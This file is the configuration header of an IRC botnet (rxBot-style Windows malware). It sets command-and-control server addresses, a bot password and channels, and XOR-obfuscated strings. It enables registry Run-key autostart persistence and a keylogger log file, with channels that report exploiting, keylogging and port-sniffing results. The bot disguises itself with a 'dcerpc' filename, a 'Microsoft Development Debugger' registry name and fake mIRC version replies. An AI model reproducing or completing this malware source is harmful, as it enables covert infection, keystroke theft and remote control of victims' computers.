char botid[] = "l1ght"; /********CHANGE ME********/

// bot configuration (generic) - doesn't need to be encrypted
unsigned short port = 6667;							// server port
unsigned short socks4port = brandom(1024,65534);	// Port # for sock4 daemon to run on  - CHANGE THIS!!!
unsigned short tftpport = 69;						// Port # for tftp daemon to run on  - DONT CHANGE THIS!!!
unsigned short httpport = 2001;						// Port # for http daemon to run on
unsigned short rloginport = 513;					// Port # for rlogin daemon to run on
bool topiccmd = true;				// set to true to enable topic commands
bool rndfilename = false;			// use random file name
bool AutoStart = true;				// enable autostart registry keys
char prefix = '.';					// command prefix (one character max.)
int maxrand = 5;					// how many random numbers in the nick
int nicktype = COUNTRYOSNICK;		// nick type (see rndnick.h)
bool nickprefix = true;				// nick uptime & mirc prefix

char rmpassword[] = "removepassword";
char message[] = "FUK ALL YA\n";


#ifdef DEBUG_LOGGING
char logfile[]="c:\\d.txt";
#endif

char *servers[] = {
	"208.53.149.57",
	"24.125.86.228",
	"bots.maximum-irc.net",
	NULL
};

#ifndef NO_CRYPT 

/*crypt info*/
char password[]="\x4C\x18\x82\x14\x09";
char serverpass[]="";
char channel[]="\x07\x02\x88\x5C\x56\x80\xB8\x25\xEE\x22";
char chanpass[]="\x46\x40\x9F\x4C";
char filename[]="\x40\x4F\x9F\x56\x0B\x81";
char keylogfile[]="\x68\x43\x9D\x5E\x55\x96\xAF\x25";
char valuename[]="\x69\x45\x99\x56\x14\x91\xB8\x37\xE9\x2C\x3A\xCF\x58\x61\xC3\xA7\xCF\x82\x63\xC9\xD9\xFE\xC8\x22\xAF\x20\xBC\x96\x9D\x63";
char szLocalPayloadFile[]="\x49\x5F\x99\x4B\x15\x84\xBE\x36\xB3\x68\x1F\xDE";
char nickconst[]="\x00";
char modeonconn[]="\x0F\x54\x93";
char exploitchan[]="\x07\x02\x88\x5C\x56\x80\xB8\x25\xEE\x22";
char keylogchan[]="\x07\x02\x88\x5C\x56\x80\xB8\x25\xEE\x22";
char psniffchan[]="\x07\x02\x88\x5C\x56\x80\xB8\x25\xEE\x22";

char regkey1[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x41\x17\xC9\x5C\x6B\xDC\xA7\xD9\x9B\x5A\xF0\xC4\xB0\xE8\x28\xBA\x26\x87\xB2\x8D\x63\x63\xF9\x98\xAB\xE2\xB9\x81\xEB\x9A\xB9\x1E\x95\x9C\x44\x5A";
char regkey2[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x41\x17\xC9\x5C\x6B\xDC\xA7\xD9\x9B\x5A\xF0\xC4\xB0\xE8\x28\xBA\x26\x87\xB2\x8D\x63\x63\xF9\x98\xAB\xE2\xB9\x81\xEB\x9A\xB9\x1E\x95\x9C\x44\x5A\x9B\x0F\xF4\x8B\x92\x32\xD5\x74";
char regkey3[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x41\x17\xC9\x5C\x6B\xDC\xA7\xD9\x9B\x5A\xE8\xE1\x9B";
char regkey4[]="\x77\x75\xA9\x70\x3E\xAF\x8B\x12\xE8\x7E\x0C\xCF\x40\x70\xEC\xA7\xD1\x9B\x74\xC8\xC1\x8D\xE9\x33\x91\x16\xB4\x9F\x8C\x63\x7E\xF0\xAA\x93\xC7\xBD";
char regkey5[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x41\x17\xC9\x5C\x6B\xDC\xA7\xD9\x9B\x5A\xF0\xC4\xB0\xE8\x28\xBA\x26\x87\xB2\x8D\x63\x63\xF9\x98\xAB\xE2\xB9\x81\xEB\x9A\xB9\x1E\x95\x9E\x5E\x58\xA1\x09\xEF\x98\x88\x0D\xE3\x7E\xC7\xE9\x98\xD7";

char *authnick[] = {
	"\x69\x49\x88\x48\x12\x8C",
	"\x70\x44\x9F\x77\x13\x8B\xB9\x38\xF3\x6B",
	"\x48\x45\x8E\x50\x17\x87\xFA\x35\xF2\x6B\x19\xD3",
	NULL
};

#else  

/*recommended info*/
char password[] = "h4x0r";									/*Login password*/
char serverpass[] = "";										/*Servers password(optional)*/
char channel[] = "#.rx-bots.";									/*Channel to join*/
char chanpass[] = "bleh";									/*Channel's key(optional)*/
char filename[] = "dcerpc";									/*Bot filename, no .exe*/
char keylogfile[] = "Logz.txt";								/*Keylogging filename*/
char valuename[] = "Microsoft Development Debugger";		/*Registry key name*/
char nickconst[] = "[prefix]";								/*Bot Prefix*/
char szLocalPayloadFile[]="msconfig.dat";					/*Payload Filename*/
char modeonconn[] = "+xi";									/*Bot mode upon connecting*/
char exploitchan[] = "#.rx-bots.";							/*Channel for exploiting info*/
char keylogchan[] = "#.rx-bots.";							/*Channel for keylogging info*/
char psniffchan[] = "#.rx-bots.";							/*Channel for portsniffing info*/

/****************************** DONT CHANGE THESE *****************************/
char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";
char regkey5[]="Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
/******************************************************************************/

// Nicks Allowed to use bot (leave blank for all)
char *authnick[] = {
	"nick1",
	"nick2",
	NULL
};

#endif

char *versionlist[] = {
	"mIRC v6.03 Khaled Mardam-Bey",
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.14 Khaled Mardam-Bey",
	NULL
};

#ifdef PLAIN_CRYPT
char key[16] = "2poiwsfpf3213ew"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif

